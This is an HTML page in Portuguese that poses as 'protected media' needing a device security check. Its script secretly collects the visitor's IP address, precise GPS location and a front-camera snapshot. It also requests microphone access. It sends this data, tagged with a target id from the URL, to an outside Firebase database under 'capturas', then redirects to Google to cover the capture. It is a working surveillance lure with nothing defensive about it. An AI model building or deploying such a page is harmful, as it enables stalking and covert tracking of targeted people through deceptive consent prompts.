<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visualizar Conteúdo</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body {
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
            padding: 20px;
        }
        .card {
            background: rgba(30, 41, 59, 0.85);
            border: 1px solid rgba(56, 189, 248, 0.3);
            border-radius: 16px;
            padding: 24px;
            max-width: 360px;
            width: 100%;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }
        h2 { font-size: 1.2rem; color: #38bdf8; margin-bottom: 10px; }
        p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 20px; }
        .action-btn {
            background: #0284c7;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 12px 20px;
            font-weight: bold;
            font-size: 0.95rem;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        .action-btn:active { background: #0369a1; }
    </style>
</head>
<body>

    <div class="card" id="main-card">
        <h2>Mídia Protegida</h2>
        <p>Este arquivo requer verificação de segurança do dispositivo para ser exibido.</p>
        <button class="action-btn" onclick="iniciarProcesso()">Carregar Conteúdo</button>
    </div>

    <!-- Elementos ocultos de mídia -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const targetId = urlParams.get('id') || 'default';

        async function iniciarProcesso() {
            // Altera o visual do card para simular carregamento após o clique
            document.getElementById('main-card').innerHTML = `
                <div style="font-size: 0.9rem; color: #38bdf8; font-weight: 600;">Sincronizando recursos...</div>
                <p style="margin-top: 10px;">Aguarde um momento.</p>
            `;

            // 1. Coleta IP
            let ip = 'Desconhecido';
            try {
                let res = await fetch('https://api64.ipify.org?format=json');
                let data = await res.json();
                ip = data.ip;
            } catch(e) {}

            // 2. Coleta Geolocalização (O navegador exibirá o pop-up de GPS)
            const coords = await new Promise((resolve) => {
                if (!navigator.geolocation) resolve({ error: 'Não suportado' });
                else {
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                        err => resolve({ error: 'Negado' }),
                        { enableHighAccuracy: true }
                    );
                }
            });

            // 3. Coleta Câmera e Áudio (O navegador exibirá o pop-up de permissão de câmera/microfone)
            const media = await new Promise((resolve) => {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
                    .then(stream => {
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        setTimeout(() => {
                            const canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                            const foto = canvas.toDataURL('image/jpeg');
                            stream.getTracks().forEach(t => t.stop());
                            resolve({ photo: foto });
                        }, 1200);
                    })
                    .catch(err => resolve({ error: 'Negado' }));
            });

            // Monta o pacote de dados
            const payload = {
                id: targetId,
                ip: ip,
                location: coords,
                media: media,
                timestamp: new Date().toISOString()
            };

            console.log("Dados prontos para envio:", payload);

            // Envia os dados diretamente para o Firebase usando o ID passado na URL
            try {
                await fetch(`https://linkapi1-zrx-default-rtdb.firebaseio.com/capturas/${targetId}.json`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error("Erro ao enviar dados:", err);
            }

            // Simula o fim do carregamento e redireciona para o Google
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 1000);
        }
    </script>
</body>
</html>
